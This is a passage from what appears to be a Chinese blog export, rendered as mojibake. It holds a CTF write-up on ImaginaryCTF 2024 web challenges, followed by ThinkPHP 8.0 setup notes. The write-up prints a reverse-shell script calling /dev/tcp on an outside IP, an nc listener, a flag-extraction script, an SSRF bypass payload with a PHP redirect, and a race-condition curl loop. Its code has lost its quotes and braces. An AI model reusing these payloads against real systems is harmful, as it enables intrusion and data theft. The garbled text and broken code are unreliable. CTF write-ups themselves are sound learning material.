codeä¹‹å‰æˆ‘ä»¬éœ€è¦å…ˆå»ç›‘å¬2333ç«¯å£ï¼šnc -lvvp 2333 ç‚¹å‡»ï¼Œä½†æ˜¯åå¼¹shellå¤±è´¥äº† å¹¸å¥½å¯ä»¥æœ¬åœ°è¿›è¡Œè°ƒè¯•ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥åœ¨dockerçš„ç»ˆç«¯ä¸Šç›´æ¥è¿è¡Œpython3 æ–‡ä»¶åï¼Œä½†æ˜¯æ–‡ä»¶ä¸æ˜¯æ‰§è¡Œåå°±ç›´æ¥åˆ æ‰äº†å—ï¼Œæˆ‘ä»¬è¦æ€ä¹ˆè·å–åˆ°æ–‡ä»¶åå‘¢ å…¶å®å¾ˆç®€å•ï¼Œæˆ‘ä»¬ä¸æ˜¯æœ¬åœ°è°ƒè¯•å—ï¼Œé‚£åªè¦æŠŠåˆ æ‰æ–‡ä»¶åçš„é‚£è¡Œä»£ç åˆ æ‰å°±å¯ä»¥äº†ï¼Œæ–‡ä»¶å°±ä¼šä¿å­˜åœ¨tmpuploadsç›®å½•ä¸‹ï¼Œä¸ä¼šè¢«åˆ æ‰ æ‰€ä»¥æˆ‘ä»¬ç›´æ¥cdåˆ°è¯¥ç›®å½•ä¸‹ï¼Œæ‰§è¡Œæ–‡ä»¶ï¼Œå‘ç°æŠ¥é”™å¦‚ä¸‹ï¼š å°†æŠ¥é”™æ‹¿ç»™gptï¼Œå‘Šè¯‰æˆ‘åŸå› å…¶å®æ˜¯å› ä¸ºæˆ‘è¿˜å¤„äºshç¯å¢ƒä¸‹ï¼Œåé¢çš„ä»£ç ä¸­æœ‰äº›è¯­æ³•è¯¥ç¯å¢ƒä¸æ”¯æŒï¼Œæ‰€ä»¥ä¿®æ”¹åçš„è„šæœ¬å¦‚ä¸‹ï¼š import subprocessdef execute_reverse_shell(): command = /bin/bash -c /bin/bash -i /dev/tcp/47.113.102.46/2333 01 # æ‰§è¡Œåå¼¹ shell å‘½ä»¤ subprocess.call(command, shell=True) # ä»£ç åˆ°è¾¾è¿™é‡Œååå¼¹ shell å‘½ä»¤å·²æ‰§è¡Œ a = Hello return a# è°ƒç”¨å‡½æ•°å¹¶æ‰“å°è¿”å›å€¼result = execute_reverse_shell()print(result) shellåå¼¹æˆåŠŸï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š å®ç°rceï¼Œå¯ä»¥å¾—åˆ°flagå•¦ æ¥ä¸‹æ¥çš„æ–¹æ³•æ˜¯å®˜æ–¹wpçš„ï¼Œå°±æ˜¯é€šè¿‡ rgb_parse å‡½æ•°ä¸ºæ¯ä¸ªå¯èƒ½çš„ ASCII å€¼ï¼ˆ0 åˆ° 255ï¼‰ç”Ÿæˆå¯¹åº”çš„ RGB å€¼ï¼Œç„¶åæŠŠflagçš„æ¯ä¸ªå­—ç¬¦ä¸€ä¸€æ¯”å¯¹ï¼Œå…¶å®å°±æ˜¯ç›¸å½“äºç›²æ³¨æ„Ÿè§‰ï¼Œè„šæœ¬å¦‚ä¸‹ï¼š import stringimport requestsimport reimport randomdef rgb_parse(seed, inp=): # è®¾ç½®éšæœºæ•°ç§å­ï¼ˆç§å­ç›¸åŒï¼Œæ¯æ¬¡ç”Ÿæˆçš„éšæœºæ•°ç›¸åŒï¼›ä¼ªéšæœºï¼‰ random.seed(seed) # å°†è¾“å…¥è½¬æ¢ä¸ºå­—ç¬¦ä¸² inp = str(inp) # ç”Ÿæˆä¸€ä¸ª100åˆ°1000ä¹‹é—´çš„éšæœºæ•´æ•°ä½œä¸ºéšæœºåŒ–å› å­ randomizer = random.randint(100, 1000) # åˆå§‹åŒ–æ€»å’Œä¸º0 total = 0 # éå†è¾“å…¥å­—ç¬¦ä¸²çš„æ¯ä¸ªå­—ç¬¦ for n in inp: # è·å–å­—ç¬¦çš„ASCIIç å€¼ n = ord(n) # å°†å­—ç¬¦çš„ASCIIç å€¼å’Œ1åˆ°10ä¹‹é—´çš„éšæœºæ•´æ•°ç›¸åŠ ï¼Œå¹¶ç´¯åŠ åˆ°æ€»å’Œä¸­ total += n+random.randint(1, 10) # è®¡ç®—RGBå€¼ rgb = total*randomizer*random.randint(100, 1000) # å¯¹RGBå€¼å–æ¨¡ï¼Œç¡®ä¿ç»“æœåœ¨0åˆ°999999999ä¹‹é—´ rgb = str(rgb%1000000000) # ä»RGBå€¼ä¸­æå–Rã€Gã€Bçš„æ•°å€¼ï¼Œå¹¶åŠ ä¸Šä¸€å®šçš„åç§»é‡ r = int(rgb[0:3]) + 29 g = int(rgb[3:6]) + random.randint(10, 100) b = int(rgb[6:9]) + 49 # å¯¹Rã€Gã€Bå€¼å–æ¨¡ï¼Œç¡®ä¿ç»“æœåœ¨0åˆ°255ä¹‹é—´ r, g, b = r%256, g%256, b%256 return (r, g, b)lookup = rgb_parse(i, aaa):i for i in range(256) #æ„é€ å­—å…¸ï¼Œé€šè¿‡ rgb_parse å‡½æ•°ä¸ºæ¯ä¸ªå¯èƒ½çš„ ASCII å€¼ï¼ˆ0 åˆ° 255ï¼‰ç”Ÿæˆå¯¹åº”çš„ RGB å€¼flag = ictfvalid = re.compile(r\\([0-9]1,3, [0-9]1,3, [0-9]1,3\\)) #æ­£åˆ™è¡¨è¾¾å¼ï¼Œç”¨äºåŒ¹é…è¿”å›çš„ RGB å€¼while flag[-1] != : payload = fimport randomimport subprocessflag = subprocess.check_output(cat flag.txt, shell=True, text=True)flag = flag.strip() #å»é™¤å¼€å¤´ç»“å°¾ç©ºç™½å­—ç¬¦random.seed(ord(flag[len(flag)])) #è®¾ç½®éšæœºç§å­return aaa #åˆ©ç”¨æ­£åˆ™è¡¨è¾¾å¼åœ¨å“åº”æ–‡æœ¬ä¸­æœç´¢åŒ¹é…é¡¹ï¼Œå¹¶ä»ä¸­æå–å‡º RGB å€¼ match = re.search(valid, requests.post(http://34.91.38.193/, data=code : payload).text) match = match.group()[1:-1] #è·å–å®Œæ•´çš„åŒ¹é…å­—ç¬¦ä¸²ï¼›[1:-1] å»æ‰å­—ç¬¦ä¸²çš„ç¬¬ä¸€ä¸ªå’Œæœ€åä¸€ä¸ªå­—ç¬¦ï¼Œå³å»æ‰æ‹¬å· match = tuple(map(int, match.split(, ))) #å°†å­—ç¬¦ä¸²ä¸­çš„ RGB å€¼è½¬æ¢ä¸ºæ•´æ•°,æœ€åå˜æˆå…ƒç»„å½¢å¼ flag += chr(lookup[match]) #å°†å…ƒç»„å½¢å¼çš„ RGB å€¼è½¬æ¢ä¸º ASCII å­—ç¬¦ï¼Œå¹¶è¿½åŠ åˆ° flag å­—ç¬¦ä¸²ä¸­ print(flag) è„šæœ¬åœ¨æœ¬åœ°è¿è¡Œï¼Œå°±å¯ä»¥å¾—åˆ°flagäº† crystalsæœ¬é¢˜çš„ä»£ç å…¶å®æ²¡ä»€ä¹ˆå¥½çœ‹çš„ï¼Œå°±æ˜¯å•çº¯çš„rubyæ¡†æ¶ä»£ç ï¼Œé‡ç‚¹çš„æ˜¯docker-compose.ymlæ–‡ä»¶ å¯ä»¥çœ‹åˆ°æˆ‘ä»¬éœ€è¦çš„flagä½äºhostnameï¼ˆä¸»æœºåï¼‰ä¸­ï¼Œå½“å‡ºç°hostnameæ—¶ï¼Œå…¶åŸæœ¬çš„å€¼ä¼šè¢«ç¯å¢ƒå˜é‡$FLAGä»£æ›¿æ‰ æ‰€ä»¥ç°åœ¨çš„é‡ç‚¹æ˜¯è¦æ€ä¹ˆè®©æœåŠ¡çˆ†å‡ºhostname äºæ˜¯æˆ‘åˆ©ç”¨gptè®©å®ƒç»™æˆ‘æ•´ç†äº†å¯ä»¥ä½¿rubyæœåŠ¡æŠ¥é”™çš„ä¸€ç³»åˆ—ç‰¹æ®Šå­—ç¬¦ï¼Œå¦‚ä¸‹ï¼š #()[]+*?|\\^$;`~!@#%=: ç”¨bpæŠ“ä¸ªåŒ…åå°†ä¸Šè¿°ä»£ç getä¼ å‚è¿›å»ï¼Œå¦‚ä¸‹ï¼š å¾—åˆ°flag rubyå…¶å®æ˜¯ä¸€ç§æ¨¡æ¿ï¼Œæ‰€ä»¥ä¸Šè¿°ä½¿ç”¨åˆ°çš„ä¸€ç³»åˆ—ç‰¹æ®Šå­—ç¬¦å…¶å®æ˜¯åŒ…å«äº†å„ç§æ¨¡æ¿è¯­è¨€çš„æ¨¡æ¿è¯­æ³•çš„æ¨¡ç³Šå­—ç¬¦ä¸²ï¼Œä¼šå¼¹å‡ºæŠ¥é”™ä¿¡æ¯ å› æ­¤è¿™é¢˜äº‹å®ä¸Šæ˜¯sstiæ³¨å…¥ï¼Œè¿™é¢˜èµ·åˆ°å…³é”®ä½œç”¨çš„å…¶å®æ˜¯ readme2æºç åŠè‡ªå·±çš„éƒ¨åˆ†æ³¨é‡Šå¥‰ä¸Šï¼š const flag = process.env.FLAG || ictfthis_is_a_fake_flagBun.serve(\tasync fetch(req) // åˆ›å»ºä¸€ä¸ªURLå¯¹è±¡ï¼Œä½¿ç”¨è¯·æ±‚çš„URL const url = new URL(req.url) // å¦‚æœè¯·æ±‚çš„pathnameä¸º/ï¼Œåˆ™è¿”å›Hello, World!çš„å“åº” if (url.pathname === /) return new Response(Hello, World!) // å¦‚æœè¯·æ±‚çš„pathnameä»¥/flag.txtå¼€å¤´ï¼Œåˆ™è¿”å›flagçš„å“åº” if (url.pathname.startsWith(/flag.txt)) return new Response(flag) // å¦‚æœè¯·æ±‚çš„pathnameä¸åŒ¹é…ä»¥ä¸Šä¸¤ç§æƒ…å†µï¼Œåˆ™è¿”å›404 Not Foundçš„å“åº” return new Response(`404 Not Found: $url.pathname`, status: 404 )\t,\tport: 3000)Bun.serve(\tasync fetch(req) // å¦‚æœè¯·æ±‚çš„ URL åŒ…å« flagï¼Œåˆ™è¿”å›çŠ¶æ€ç ä¸º 403 çš„å“åº” if (req.url.includes(flag)) return new Response(Nope, status: 403 ) // æ£€æŸ¥è¯·æ±‚å¤´ä¸­æ˜¯å¦åŒ…å« flag const headerContainsFlag = [...req.headers.entries()].some(([k, v]) = k.includes(flag) || v.includes(flag)) // å¦‚æœè¯·æ±‚å¤´ä¸­åŒ…å« flagï¼Œåˆ™è¿”å›çŠ¶æ€ç ä¸º 403 çš„å“åº” if (headerContainsFlag) return new Response(Nope, status: 403 ) // åˆ›å»º URL å¯¹è±¡ const url = new URL(req.url) // å¦‚æœ URL çš„ href åŒ…å« flagï¼Œåˆ™è¿”å›çŠ¶æ€ç ä¸º 403 çš„å“åº” if (url.href.includes(flag)) return new Response(Nope, status: 403 ) // å‘é€è¯·æ±‚åˆ°æœ¬åœ°æœåŠ¡å™¨çš„ 3000 ç«¯å£ï¼Œå¹¶å°†è¯·æ±‚çš„ methodã€headers å’Œ body ä¼ é€’ç»™æ–°çš„è¯·æ±‚ return fetch(new URL(url.pathname + url.search, http://localhost:3000/), method: req.method, headers: req.headers, body: req.body )\t,\tport: 4000 // only this port are exposed to the public) åªèƒ½è¯´æ²¡æœ‰æ€è·¯ï¼Œå»çœ‹å…¶ä»–å¸ˆå‚…çš„wp åœ¨ç«¯å£4000ä½¿ç”¨çš„å‡½æ•°ä¼šå…ˆéªŒè¯è¯·æ±‚çš„urlå’Œæ ‡å¤´æ˜¯å¦æœ‰flagï¼Œä½¿ç”¨ JavaScript API URL æ¥è§£æè¯·æ±‚çš„ URLï¼Œå¹¶å†æ¬¡æ£€æŸ¥è§£æçš„ URL æ˜¯å¦åŒ…å«flag åœ¨ä¸Šé¢ä¸¤ä¸ªæ£€æŸ¥éƒ½é€šè¿‡çš„å‰æä¸‹ï¼Œæ‰ä¼šæƒ³3000ç«¯å£å‘é€è¯·æ±‚ å› æ­¤æˆ‘ä»¬éœ€è¦é€šè¿‡æŸç§æ–¹å¼ç»•è¿‡4000ç«¯å£çš„æ£€æµ‹ï¼Œä¸‹é¢ä¸ºåˆ«äººçš„æ€è·¯ é€šè¿‡dockeræŸ¥çœ‹æŠ¥é”™ä¿¡æ¯ï¼Œå¦‚ä¸‹ï¼š urlè§£æå‡ºé”™ ç¨å¾®æ›´æ”¹ä¸€ä¸‹app.jsæ–‡ä»¶ï¼Œå¦‚ä¸‹ï¼š ä¼šå‘ç°æˆ‘ä»¬çš„pathnameå‰é¢å¤šäº†ä¸€ä¸ª/ å¦‚æœæˆ‘ä»¬é˜…è¯»æœ‰å…³ API URL çš„ mdn Web æ–‡æ¡£ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°è¿™ä¸ªæ— æ•ˆçš„ URL ç¤ºä¾‹ï¼š ä½†æ˜¯å¦‚æœæˆ‘ä»¬åœ¨åŠ ä¸Šä¸€äº›ä¸œè¥¿å‘¢ï¼Œæ¯”å¦‚ï¼š/foobar æƒŠå¥‡åœ°å‘ç°å¤šäº†httpåè®®ï¼Œå¹¶ä¸”å‘é€äº†è¯·æ±‚ äºæ˜¯æˆ‘ä»¬å¯ä»¥æ¥ä¸ª302è·³è½¬æ¥å¾—åˆ°flagï¼Œæ–‡ä»¶å¦‚ä¸‹ï¼š ?php header(Location:http://localhost:3000/flag.txt); äºæ˜¯æˆ‘ä»¬çš„payloadä¸ºï¼šhttp://localhost:5775//5.5.5.5:9320 the_amazing_raceè¿™é“é¢˜çš„è§£é¢˜æ€è·¯æ¥çœ‹çœ‹è¿™ä½ä½¬çš„wpï¼šhttps://siunam321.github.io/ctf/ImaginaryCTF-2024/Web/The-Amazing-Race/ ç®€è€Œè¨€ä¹‹å°±æ˜¯åˆ©ç”¨æ¡ä»¶ç«äº‰ï¼Œé‚£ä½å¸ˆå‚…è®²çš„å¾ˆè¯¦ç»†ï¼Œæˆ‘å°±ä¸å®œå¤šè¯´äº† è¿™è¾¹æä¾›ä¸€ä¸‹å®˜æ–¹é¢˜è§£çš„è„šæœ¬ï¼Œå¦‚ä¸‹ï¼š #!/usr/bin/env python3from subprocess import Popenfrom time import sleepmazeId = f395eaa8-1d61-44e7-8e7a-8f3d73176408# Can tunnel through walls in specified direction if theres at least# one empty space before the wall## Run, readjust position/direction as desired, repeat until flagurl = fhttp://localhost:6563/move?id=mazeIdmove=rightfor i in range(50): Popen([curl, -X, POST, url]) sleep(.00) å˜é‡urlçš„moveå€¼è¦æ ¹æ®å®é™…æƒ…å†µè¿›è¡Œæ›´æ”¹ ç„¶åå¤šå¤šå°è¯•ï¼Œè„šæœ¬å¤šè¿è¡Œè¿è¡Œï¼Œä¸€æ¬¡æ˜¯æˆåŠŸä¸äº†çš„","categories":["Write-Up"]},{"title":"thinkphpå­¦ä¹ ","path":"/2024/07/14/thinkphpå­¦ä¹ /","content":"å¼•ç”¨thinkPHP8.0å®‰è£…ä¸é¿å‘ ThinPHPå®˜æ–¹æ‰‹å†Œ å®‰è£…thinphp8.0!--1ã€è®¿é—®ç½‘å€ä¸‹è½½å®‰è£…composer--https://getcomposer.org/Composer-Setup.exe!--2ã€é…ç½®é•œåƒæºé˜²æ­¢ä¹±ä¸ƒå…«ç³Ÿçš„ç½‘ç»œå’ŒGitHubä»“åº“æ‹‰å–æ— æƒé™é—®é¢˜--composer config -g repo.packagist composer https://mirrors.aliyun.com/composer/!--3ã€åœ¨ç½‘ç«™æ ¹ç›®å½•(www)ä¸‹è¿›å…¥cmdåˆ›å»ºé¡¹ç›®--composer create-project topthink/think tpcd tp!--4ã€è§£å†³ä¾èµ–é¡¹æŠ¥é”™--composer up --ignore-platform-reqs!--5ã€è¿è¡Œå‘½ä»¤æŸ¥çœ‹æ•ˆæœ--php think run!--6ã€è®¿é—®æŸ¥çœ‹ç»“æœï¼Œè¿™é‡Œæœ‰å‘ï¼šä¸èƒ½ç›´æ¥è®¿é—®0.0.0.0:8000è¿™ä¸ªåœ°å€--127.0.0.1:8000 åœ¨ç¬¬ä¸‰æ­¥åˆ›å»ºtké¡¹ç›®æ—¶å€™æœ‰æŠ¥é”™æ˜¯æ­£å¸¸çš„ï¼Œå› ä¸ºæœ‰ä¾èµ–é¡¹æ— æ³•å®‰è£…çš„é—®é¢˜(æˆ‘å®‰è£…æ—¶å€™çš„PHPè§£é‡Šå™¨ç‰ˆæœ¬æ˜¯8.2.9)ï¼Œæ‰€ä»¥éœ€è¦åˆ‡æ¢åˆ°tké¡¹ç›®ç›®å½•ä¸‹æ‰§è¡Œå‘½ä»¤è§£å†³ä¾èµ–é¡¹æ— æ³•å®‰è£…çš„é—®é¢˜ åŸºç¡€ç›®å½•ç»“æ„å•åº”ç”¨æ¨¡å¼é»˜è®¤å®‰è£…åçš„ç›®å½•ç»“æ„å°±æ˜¯å•åº”ç”¨ç›®å½•ç»“æ„ www WEBéƒ¨ç½²ç›®å½•ï¼ˆæˆ–è€…å­ç›®å½•ï¼‰â”œâ”€app åº”ç”¨ç›®å½•â”‚ â”œâ”€controller æ§åˆ¶å™¨ç›®å½•â”‚ â”œâ”€model æ¨¡å‹ç›®å½•â”‚ â”œâ”€ ... æ›´å¤šç±»åº“ç›®å½•â”‚ â”‚â”‚ â”œâ”€common.php å…¬å…±å‡½æ•°æ–‡ä»¶â”‚ â””â”€event.php äº‹ä»¶å®šä¹‰æ–‡ä»¶â”‚â”œâ”€config é…ç½®ç›®å½•â”‚ â”œâ”€app.php åº”ç”¨é…ç½®â”‚ â”œâ”€cache.php ç¼“å­˜é…ç½®â”‚ â”œâ”€console.php æ§åˆ¶å°é…ç½®â”‚ â”œâ”€cookie.php Cookieé…ç½®â”‚ â”œâ”€database.php æ•°æ®åº“é…ç½®â”‚ â”œâ”€filesystem.php æ–‡ä»¶ç£ç›˜é…ç½®â”‚ â”œâ”€lang.php å¤šè¯­è¨€é…ç½®â”‚ â”œâ”€log.php æ—¥å¿—é…ç½®â”‚ â”œâ”€middleware.php ä¸­é—´ä»¶é…ç½®â”‚ â”œâ”€route.php URLå’Œè·¯ç”±é…ç½®â”‚ â”œâ”€session.php Sessioné…ç½®â”‚ â”œâ”€trace.php Traceé…ç½®â”‚ â””â”€view.php è§†å›¾é…ç½®â”‚â”œâ”€view è§†å›¾ç›®å½•â”œâ”€route è·¯ç”±å®šä¹‰ç›®å½•â”‚ â”œâ”€route.php è·¯ç”±å®šä¹‰æ–‡ä»¶â”‚ â””â”€ ... â”‚â”œâ”€public WEBç›®å½•ï¼ˆå¯¹å¤–è®¿é—®ç›®å½•ï¼‰â”‚ â”œâ”€index.php å…¥å£æ–‡ä»¶â”‚ â”œâ”€router.php å¿«é€Ÿæµ‹è¯•æ–‡ä»¶â”‚ â””â”€.htaccess ç”¨äºapacheçš„é‡å†™â”‚â”œâ”€extend æ‰©å±•ç±»åº“ç›®å½•â”œâ”€runtime åº”ç”¨çš„è¿è¡Œæ—¶ç›®å½•ï¼ˆå¯å†™ï¼Œå¯å®šåˆ¶ï¼‰â”œâ”€vendor Composerç±»åº“ç›®å½•â”œâ”€.example.env ç¯å¢ƒå˜é‡ç¤ºä¾‹æ–‡ä»¶â”œâ”€composer.json composer å®šä¹‰æ–‡ä»¶â”œâ”€LICENSE.txt æˆæƒè¯´æ˜æ–‡ä»¶â”œâ”€README.md README æ–‡ä»¶â”œâ”€think å‘½ä»¤è¡Œå…¥å£æ–‡ä»¶ å¤šåº”ç”¨æ¨¡å¼è¯¦è§å®˜æ–¹æ‰‹å†Œ é»˜è®¤åº”ç”¨æ–‡ä»¶é»˜è®¤å®‰è£…åï¼Œappç›®å½•ä¸‹ä¼šåŒ…å«ä¸‹é¢çš„æ–‡ä»¶ã€‚ â”œâ”€app åº”ç”¨ç›®å½•â”‚ â”‚â”‚ â”œâ”€BaseController.php é»˜è®¤åŸºç¡€æ§åˆ¶å™¨ç±»â”‚ â”œâ”€ExceptionHandle.php åº”ç”¨å¼‚å¸¸å®šä¹‰æ–‡ä»¶â”‚ â”œâ”€common.php å…¨å±€å…¬å…±å‡½æ•°æ–‡ä»¶â”‚ â”œâ”€middleware.php å…¨å±€ä¸­é—´ä»¶å®šä¹‰æ–‡ä»¶â”‚ â”œâ”€provider.php æœåŠ¡æä¾›å®šä¹‰æ–‡ä»¶â”‚ â”œâ”€Request.php åº”ç”¨è¯·æ±‚å¯¹è±¡â”‚ â””â”€event.php å…¨å±€äº‹ä»¶å®šä¹‰æ–‡ä»¶ BaseController.phpã€Request.php å’ŒExceptionHandle.phpä¸‰ä¸ªæ–‡ä»¶æ˜¯ç³»ç»Ÿé»˜è®¤æä¾›çš„åŸºç¡€æ–‡ä»¶ï¼Œä½ç½®ä½ å¯ä»¥éšæ„ç§»åŠ¨ï¼Œä½†æ³¨æ„è¦åŒæ­¥è°ƒæ•´ç±»çš„å‘½åç©ºé—´ã€‚å¦‚æœä½ ä¸éœ€è¦ä½¿ç”¨Request.php å’ŒExceptionHandle.phpæ–‡ä»¶ï¼Œæˆ–è€…è¦è°ƒæ•´ç±»åï¼Œè®°å¾—å¿…é¡»åŒæ­¥è°ƒæ•´provider.phpæ–‡ä»¶ä¸­çš„å®¹å™¨å¯¹è±¡ç»‘å®šã€‚ é…ç½® é»˜è®¤æƒ…å†µä¸‹ï¼Œç¨‹åºå‡ºé”™ä¼šæ˜¾ç¤ºï¼šé¡µé¢å‡ºé”™ï¼è¯·ç¨å€™å†è¯•~ è¿™ç§æƒ…å†µï¼Œä¸€èˆ¬æ˜¯åº”ç”¨éƒ¨ç½²å¥½åï¼Œä¸‡ä¸€å‡ºé”™ç»™ç”¨æˆ·çœ‹çš„ï¼› å¦‚æœæˆ‘ä»¬è‡ªå·±åœ¨å¼€å‘é˜¶æ®µï¼Œéœ€è¦å¼€å¯è°ƒè¯•æ¨¡å¼ï¼Œæ¥æç¤ºå…·ä½“çš„é”™è¯¯ä¿¡æ¯ï¼š åœ¨æ ¹ç›®å½•æœ‰ä¸€ä¸ªæ–‡ä»¶ï¼š.example.envï¼Œæ”¹æˆ .env ï¼Œä¹Ÿå°±æ˜¯å»æ‰ç‚¹å‰é¢ï¼›ï¼ˆç¯å¢ƒå˜é‡æ–‡ä»¶ï¼‰ ç„¶ååœ¨é…ç½®ä¿¡æ¯çš„ç¬¬ä¸€è¡Œï¼šAPP_DEBUG true å³å¯ï¼Œfalseåˆ™ä¸å¼€å¯ã€‚ å¼€å¯åä¼šå¦‚ä¸‹æ‰€ç¤ºï¼š è°ƒè¯•æ¨¡å¼å¼€å¯åï¼Œå¯ä»¥å‘ç°å³ä¸‹è§’ä¼šå‡ºç°traceè°ƒè¯•å·¥å…·å°å›¾æ ‡ï¼š åŒ…å«äº†ä¸°å¯Œçš„è°ƒè¯•å†…å®¹ï¼šå…·ä½“è‡ªç‚¹æŸ¥çœ‹ã€‚ æ¶æ„HTTPè¯·æ±‚æµç¨‹å¯¹äºä¸€ä¸ªHTTPåº”ç”¨æ¥è¯´ï¼Œä»ç”¨æˆ·å‘èµ·è¯·æ±‚åˆ°å“åº”è¾“å‡ºç»“æŸï¼Œå¤§è‡´çš„æ ‡å‡†è¯·æ±‚æµç¨‹å¦‚ä¸‹ï¼š è½½å…¥Composerçš„è‡ªåŠ¨åŠ è½½autoloadæ–‡ä»¶ å®ä¾‹åŒ–ç³»ç»Ÿåº”ç”¨åŸºç¡€ç±»think\\App è·å–åº”ç”¨ç›®å½•ç­‰ç›¸å…³è·¯å¾„ä¿¡æ¯ åŠ è½½å…¨å±€çš„æœåŠ¡æä¾›provider.phpæ–‡ä»¶ è®¾ç½®å®¹å™¨å®ä¾‹åŠåº”ç”¨å¯¹è±¡å®ä¾‹ï¼Œç¡®ä¿å½“å‰å®¹å™¨å¯¹è±¡å”¯ä¸€ ä»å®¹å™¨ä¸­è·å–HTTPåº”ç”¨ç±»think\\Http æ‰§è¡ŒHTTPåº”ç”¨ç±»çš„runæ–¹æ³•å¯åŠ¨ä¸€ä¸ªHTTPåº”ç”¨ è·å–å½“å‰è¯·æ±‚å¯¹è±¡å®ä¾‹ï¼ˆé»˜è®¤ä¸º app\\Request ç»§æ‰¿think\\Requestï¼‰ä¿å­˜åˆ°å®¹å™¨ æ‰§è¡Œthink\\Appç±»çš„åˆå§‹åŒ–æ–¹æ³•initialize åŠ è½½ç¯å¢ƒå˜é‡æ–‡ä»¶.envå’Œå…¨å±€åˆå§‹åŒ–æ–‡ä»¶ åŠ è½½å…¨å±€å…¬å…±æ–‡ä»¶ã€ç³»ç»ŸåŠ©æ‰‹å‡½æ•°ã€å…¨å±€é…ç½®æ–‡ä»¶ã€å…¨å±€äº‹ä»¶å®šä¹‰å’Œå…¨å±€æœåŠ¡å®šä¹‰ åˆ¤æ–­åº”ç”¨æ¨¡å¼ï¼ˆè°ƒè¯•æˆ–è€…éƒ¨ç½²æ¨¡å¼ï¼‰ ç›‘å¬AppInitäº‹ä»¶ æ³¨å†Œå¼‚å¸¸å¤„ç† æœåŠ¡æ³¨å†Œ å¯åŠ¨æ³¨å†Œçš„æœåŠ¡ åŠ è½½å…¨å±€ä¸­é—´ä»¶å®šä¹‰ ç›‘å¬HttpRunäº‹ä»¶ æ‰§è¡Œå…¨å±€ä¸­é—´ä»¶ æ‰§è¡Œè·¯ç”±è°ƒåº¦ï¼ˆRouteç±»dispatchæ–¹æ³•ï¼‰ å¦‚æœå¼€å¯è·¯ç”±åˆ™æ£€æŸ¥è·¯ç”±ç¼“å­˜ åŠ è½½è·¯ç”±å®šä¹‰ ç›‘å¬RouteLoadedäº‹ä»¶ å¦‚æœå¼€å¯æ³¨è§£è·¯ç”±åˆ™æ£€æµ‹æ³¨è§£è·¯ç”± è·¯ç”±æ£€æµ‹ï¼ˆä¸­é—´æµç¨‹å¾ˆå¤æ‚ ç•¥ï¼‰ è·¯ç”±è°ƒåº¦å¯¹è±¡think\\route\\Dispatchåˆå§‹åŒ– è®¾ç½®å½“å‰è¯·æ±‚çš„æ§åˆ¶å™¨å’Œæ“ä½œå æ³¨å†Œè·¯ç”±ä¸­é—´ä»¶ ç»‘å®šæ•°æ®æ¨¡å‹ è®¾ç½®è·¯ç”±é¢å¤–å‚æ•° æ‰§è¡Œæ•°æ®è‡ªåŠ¨éªŒè¯ æ‰§è¡Œè·¯ç”±è°ƒåº¦å­ç±»çš„execæ–¹æ³•è¿”å›å“åº”think\\Responseå¯¹è±¡ è·å–å½“å‰è¯·æ±‚çš„æ§åˆ¶å™¨å¯¹è±¡å®ä¾‹ åˆ©ç”¨åå°„æœºåˆ¶æ³¨å†Œæ§åˆ¶å™¨ä¸­é—´ä»¶ æ‰§è¡Œæ§åˆ¶å™¨æ–¹æ³•ä»¥åŠå‰åç½®ä¸­é—´ä»¶ æ‰§è¡Œå½“å‰å“åº”å¯¹è±¡çš„sendæ–¹æ³•è¾“å‡º æ‰§è¡ŒHTTPåº”ç”¨å¯¹è±¡çš„endæ–¹æ³•å–„å ç›‘å¬HttpEndäº‹ä»¶ æ‰§è¡Œä¸­é—´ä»¶çš„endå›è°ƒ å†™å…¥å½“å‰è¯·æ±‚çš„æ—¥å¿—ä¿¡æ¯ å…¥å£æ–‡ä»¶ThinkPHP8.0é‡‡ç”¨å•ä¸€å…¥å£æ¨¡å¼è¿›è¡Œé¡¹ç›®éƒ¨ç½²å’Œè®¿é—®ï¼Œä¸€ä¸ªåº”ç”¨éƒ½æœ‰ä¸€ä¸ªç»Ÿä¸€ï¼ˆä½†ä¸ä¸€å®šæ˜¯å”¯ä¸€ï¼‰çš„å…¥å£ã€‚å¦‚æœé‡‡ç”¨è‡ªåŠ¨å¤šåº”ç”¨éƒ¨ç½²çš„è¯ï¼Œä¸€ä¸ªå…¥å£æ–‡ä»¶è¿˜å¯ä»¥è‡ªåŠ¨å¯¹åº”å¤šä¸ªåº”ç”¨ã€‚ åº”ç”¨å…¥å£æ–‡ä»¶é»˜è®¤çš„åº”ç”¨å…¥å£æ–‡ä»¶ä½äºpublic/index.phpï¼Œå¦‚æœä½ æ²¡æœ‰ç‰¹æ®Šçš„è‡ªå®šä¹‰éœ€æ±‚ï¼Œæ— éœ€å¯¹å…¥å£æ–‡ä»¶åšä»»ä½•çš„æ›´æ”¹ã€‚å…¥å£æ–‡ä»¶ä½ç½®çš„è®¾è®¡æ˜¯ä¸ºäº†è®©åº”ç”¨éƒ¨ç½²æ›´å®‰å…¨ï¼Œè¯·å°½é‡éµå¾ªpublicç›®å½•ä¸ºå”¯ä¸€çš„webå¯è®¿é—®ç›®å½•ï¼Œå…¶ä»–çš„æ–‡ä»¶éƒ½å¯ä»¥æ”¾åˆ°éWEBè®¿é—®ç›®å½•ä¸‹é¢ æ§åˆ¶å°å…¥å£æ–‡ä»¶é™¤äº†åº”ç”¨å…¥å£æ–‡ä»¶å¤–ï¼Œç³»ç»Ÿè¿˜æä¾›äº†ä¸€ä¸ªæ§åˆ¶å°å…¥å£æ–‡ä»¶ï¼ˆå³ä½äºé¡¹ç›®æ ¹ç›®å½•çš„thinkæ–‡ä»¶ï¼‰ æ§åˆ¶å°å…¥å£æ–‡ä»¶ç”¨äºæ‰§è¡Œæ§åˆ¶å°æŒ‡ä»¤ï¼Œä¾‹å¦‚ï¼š php think version ç³»ç»Ÿå†…ç½®äº†ä¸€äº›å¸¸ç”¨çš„æ§åˆ¶å°æŒ‡ä»¤ï¼Œå¦‚æœä½ å®‰è£…äº†é¢å¤–çš„æ‰©å±•ï¼Œä¹Ÿä¼šå¢åŠ ç›¸åº”çš„æ§åˆ¶å°æŒ‡ä»¤ï¼Œéƒ½æ˜¯é€šè¿‡è¯¥å…¥å£æ–‡ä»¶æ‰§è¡Œçš„ã€‚ å¤šåº”ç”¨æ¨¡å¼è¯¦è§å®˜æ–¹æ‰‹å†Œ URLè®¿é—®å•åº”ç”¨URLhttp://serverName/index.php/æ§åˆ¶å™¨/æ“ä½œ/å‚æ•°/å€¼â€¦ 